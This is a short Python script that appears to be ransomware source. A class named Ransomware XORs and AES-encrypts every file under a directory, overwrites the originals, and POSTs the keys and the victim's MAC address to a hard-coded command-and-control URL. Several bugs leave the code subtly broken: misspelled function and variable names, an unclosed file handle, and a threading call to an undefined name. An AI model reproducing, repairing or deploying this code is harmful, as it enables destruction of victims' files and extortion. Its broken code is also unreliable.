#Prince Osei JUnior

#! usr/bin/env python3


import os, threading
from termcolor import colored
import base64, hashlib
import urllib
import requests
import binascii
import getmac
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes


class Ransomware:

    def encrypt(self, file):

        fd = open(file, "rb")
        data = binascii.hexlify(fd.read())
        fd.close()
        
        xor_data = b""
        i = 0
        
        while i < len(data):
            xor_data += chr(data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
            i += 1
            
        cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
        ciphertext = cipher.encrypt(pad(xor_data, AES.block_size))
        
        fd = open(file, "wb")
        fd.write(ciphertext)
        fd.close
        
    def generate_key(self):
        print(f"[*]Generating Encrypion Keys...")
        self.xor_key = binascii.hexifly(Random.new().read(AES.block_size - 8))
        self.enc_key = hashlib.sha256(self.xor_key + Random.new().read(AES.block_size)).digest()
        self.iv = Random.new().read(AES.block_size)
        self.victim_mac_address = getmac.get_mac_address().encode()
        self.save_keys()
        
    def save_keys(self):
        c2_url = "http://192.168.1.1/saved00_keys"
        data = {"mac_address": self.encode_keys(self.victim_mac_address), "xor_key": self.encode_keys(self.xor_key), "encode_key" :                 self.encode_keys(self.enc_key), "init_vector": self.encode_keys(self.iv)}
        requests.post(c2_url, data = data)
        
    def encode_keys(self, key):
        return urllib.parse.quote(base64.b64encode(key))
        
        
    def dir_to_encrypt(self, file_directory):
        self.generate_keys()
        print(colored("[+] Encrypting FIle Directories"))
        for root, dir, files in os.walk(file_direcotry):
            for file in files:
                self.encrypt("{}/{}".format(root, file))
        
        
ransom = Ransomware()
ransom.dir_to_encrypt("/file_directories")

if __name__ == "__main__":
    thread = threading.Thread(target=encrypt, args=file)
    thread.start()
    
    